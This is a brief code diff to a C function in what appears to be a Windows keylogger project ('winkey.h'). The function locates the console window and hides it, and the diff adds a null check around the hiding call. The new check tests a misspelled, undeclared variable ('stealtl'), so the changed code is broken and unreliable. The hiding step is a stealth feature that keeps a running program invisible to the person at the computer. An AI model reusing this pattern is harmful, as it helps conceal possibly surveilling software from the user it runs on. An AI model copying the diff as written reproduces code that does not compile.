@@ -1,10 +1,12 @@
 #include "winkey.h"
 
 
-void    hideWindow(void)
+void    HideWindow(void)
 {
     HWND    stealth;
 
     stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth, SW_HIDE);
+
+    if (stealtl != NULL)
+        ShowWindow(stealth, SW_HIDE);
 }
